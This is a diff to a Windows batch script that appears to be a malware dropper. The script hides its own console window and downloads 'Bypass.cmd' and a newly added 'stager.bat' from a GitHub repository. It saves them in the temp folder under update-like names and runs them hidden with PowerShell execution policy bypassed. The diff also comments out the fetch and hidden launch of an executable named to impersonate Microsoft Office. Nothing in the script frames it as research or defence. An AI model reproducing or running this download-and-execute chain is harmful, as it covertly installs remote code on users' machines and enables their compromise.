@@ -27,23 +27,26 @@ goto gotAdmin
 powershell -Command "Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'; $h = (Get-Process -PID $pid).MainWindowHandle; [Console.Window]::ShowWindow($h, 0)"
 
 set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/Bypass.cmd"
-set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Microsoft@Office.exe"
+set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/stager.bat"
+rem set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Microsoft@Office.exe"
 set "PS1_FILE=%temp%\WinUpdater.cmd"
-set "EXE_FILE=%temp%\Microsoft@Office.exe"
+set "PS1.2_FILE=%temp%\WinUpdates.bat"
+rem set "EXE_FILE=%temp%\Microsoft@Office.exe"
 
 echo Downloading files...
 powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'" 2>nul
-
-powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'" 2>nul
+powershell -Command "Invoke-WebRequest -Uri '%PS1.2_URL%' -OutFile '%PS1.2_FILE%'" 2>nul
+rem powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'" 2>nul
 
 echo Executing PowerShell script...
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS1_FILE%" 2>nul
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS1.2_FILE%" 2>nul
 
 echo Waiting for 60 seconds...
 timeout /t 60 /nobreak >nul
 
 echo Launching executable...
-:: Hidden execution using PowerShell
-powershell -Command "Start-Process -FilePath '%EXE_FILE%' -WindowStyle Hidden"
+rem :: Hidden execution using PowerShell
+rem powershell -Command "Start-Process -FilePath '%EXE_FILE%' -WindowStyle Hidden"
 
 endlocal
